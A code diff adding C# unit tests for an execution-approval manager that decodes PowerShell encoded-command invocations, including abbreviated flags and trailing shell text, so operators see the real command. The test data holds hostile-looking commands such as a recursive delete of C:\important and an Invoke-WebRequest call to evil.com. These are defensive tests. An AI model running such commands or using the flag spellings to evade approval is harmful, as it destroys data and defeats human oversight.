@@ -252,6 +252,166 @@ public sealed class ExecApprovalManagerTests
         lateAttempt.ShouldBeFalse();
     }
 
+    // ── #2604 — abbreviated spellings and trailing command text ──────
+
+    /// <summary>
+    /// PowerShell resolves a parameter from any unambiguous prefix of its name, so every prefix of
+    /// <c>EncodedCommand</c> from <c>e</c> upwards selects encoded-command mode, as does the documented
+    /// <c>ec</c> alias. Each spelling must decode to the same plaintext.
+    /// </summary>
+    [Theory]
+    [InlineData("e")]
+    [InlineData("en")]
+    [InlineData("enc")]
+    [InlineData("enco")]
+    [InlineData("encod")]
+    [InlineData("encode")]
+    [InlineData("encoded")]
+    [InlineData("encodedc")]
+    [InlineData("encodedco")]
+    [InlineData("encodedcom")]
+    [InlineData("encodedcomm")]
+    [InlineData("encodedcomma")]
+    [InlineData("encodedcomman")]
+    [InlineData("encodedcommand")]
+    [InlineData("ec")]
+    [InlineData("EC")]
+    [InlineData("EnC")]
+    public void Issue_WithAnyUnambiguousEncodedCommandPrefix_ReturnsDecodedCanonicalCommand(string flag)
+    {
+        const string Payload = "Remove-Item C:\\important -Recurse";
+        var rawCommand = $"pwsh -{flag} {BuildPowerShellEncoded(Payload)}";
+
+        var request = _sut.Issue("session-1", rawCommand);
+
+        request.CanonicalCommand.ShouldBe(Payload);
+    }
+
+    /// <summary>Both <c>-</c> and <c>/</c> are accepted as the flag prefix.</summary>
+    [Theory]
+    [InlineData("-")]
+    [InlineData("/")]
+    public void Issue_WithEitherFlagPrefixCharacter_ReturnsDecodedCanonicalCommand(string prefix)
+    {
+        const string Payload = "Get-Secret";
+        var rawCommand = $"pwsh {prefix}enc {BuildPowerShellEncoded(Payload)}";
+
+        var request = _sut.Issue("session-1", rawCommand);
+
+        request.CanonicalCommand.ShouldBe(Payload);
+    }
+
+    /// <summary>
+    /// The base64 run terminates at the first non-base64 character, not at end-of-string, so a
+    /// payload followed by further shell syntax still decodes. The trailing text is preserved so the
+    /// operator sees the whole command.
+    /// </summary>
+    [Theory]
+    [InlineData(" | Out-File x")]
+    [InlineData(" ; echo hi")]
+    [InlineData(" && echo hi")]
+    [InlineData(" > out.txt")]
+    [InlineData(" -NoProfile")]
+    public void Issue_WithTrailingCommandTextAfterPayload_StillDecodesAndKeepsTrailingText(string trailing)
+    {
+        const string Payload = "Invoke-WebRequest evil.com";
+        var rawCommand = $"pwsh -ec {BuildPowerShellEncoded(Payload)}{trailing}";
+
+        var request = _sut.Issue("session-1", rawCommand);
+
+        request.CanonicalCommand.ShouldBe(Payload + trailing);
+        request.CanonicalCommand.ShouldNotContain(BuildPowerShellEncoded(Payload));
+    }
+
+    /// <summary>The eight cases enumerated in issue #2604 must all decode.</summary>
+    [Theory]
+    [InlineData("pwsh -ec {0}", "")]
+    [InlineData("pwsh -EncodedCommand {0}", "")]
+    [InlineData("pwsh -NoProfile -ec {0}", "")]
+    [InlineData("pwsh -e {0}", "")]
+    [InlineData("pwsh -en {0}", "")]
+    [InlineData("pwsh -enc {0}", "")]
+    [InlineData("pwsh -ec {0} | Out-File x", " | Out-File x")]
+    [InlineData("pwsh -ec {0} ; echo hi", " ; echo hi")]
+    public void Issue_ForEveryCaseInIssue2604_ReturnsDecodedPlaintext(string template, string expectedTrailing)
+    {
+        const string Payload = "Get-Process";
+        var rawCommand = string.Format(
+            System.Globalization.CultureInfo.InvariantCulture,
+            template,
+            BuildPowerShellEncoded(Payload));
+
+        var request = _sut.Issue("session-1", rawCommand);
+
+        request.CanonicalCommand.ShouldBe(Payload + expectedTrailing);
+    }
+
+    // ── #2604 negative cases — legitimate commands must not be mangled ─
+
+    /// <summary>
+    /// A command that merely contains the literal text <c>-ec</c> (or another <c>-e</c> prefix) but is
+    /// not an encoded-command invocation must be returned byte-for-byte unchanged.
+    /// </summary>
+    [Theory]
+    [InlineData("git commit -ec")]
+    [InlineData("grep -ec pattern file.txt")]
+    [InlineData("pwsh -ExecutionPolicy Bypass -File script.ps1")]
+    [InlineData("docker run -e FOO=bar image")]
+    [InlineData("echo -ec")]
+    [InlineData("myapp --ec hello-world")]
+    [InlineData("pwsh -ec")]
+    public void Issue_WithNonEncodedCommandContainingSimilarFlag_ReturnsCommandUnchanged(string command)
+    {
+        var request = _sut.Issue("session-1", command);
+
+        request.CanonicalCommand.ShouldBe(command);
+    }
+
+    /// <summary>
+    /// <c>-ex</c> and longer are <c>-ExecutionPolicy</c>, not <c>-EncodedCommand</c>, so a base64-looking
+    /// argument after them must not be decoded.
+    /// </summary>
+    [Theory]
+    [InlineData("ex")]
+    [InlineData("exe")]
+    [InlineData("executionpolicy")]
+    public void Issue_WithExecutionPolicyPrefix_DoesNotDecode(string flag)
+    {
+        var rawCommand = $"pwsh -{flag} {BuildPowerShellEncoded("Get-Process")}";
+
+        var request = _sut.Issue("session-1", rawCommand);
+
+        request.CanonicalCommand.ShouldBe(rawCommand);
+    }
+
+    /// <summary>Malformed base64 after a trailing pipe still falls through unchanged and never throws.</summary>
+    [Fact]
+    public void Issue_WithMalformedBase64AndTrailingText_ReturnsCommandUnchanged()
+    {
+        const string RawCommand = "pwsh -enc AAA | Out-File x";
+
+        var request = _sut.Issue("session-1", RawCommand);
+
+        request.CanonicalCommand.ShouldBe(RawCommand);
+    }
+
+    /// <summary>
+    /// A decoded canonical command still round-trips through single-use redemption, so widening the
+    /// pattern does not weaken the exact-match invariant.
+    /// </summary>
+    [Fact]
+    public void TryRedeem_WithDecodedAbbreviatedFlag_RejectsTheRawEncodedForm()
+    {
+        const string Payload = "Stop-Computer";
+        var rawCommand = $"pwsh -enc {BuildPowerShellEncoded(Payload)}";
+        var request = _sut.Issue("session-1", rawCommand);
+
+        _sut.TryRedeem(request.TokenId, "session-1", rawCommand).ShouldBeFalse();
+
+        var reissued = _sut.Issue("session-1", rawCommand);
+        _sut.TryRedeem(reissued.TokenId, "session-1", Payload).ShouldBeTrue();
+    }
+
     // ── Helpers ───────────────────────────────────────────────────────
 
     /// <summary>
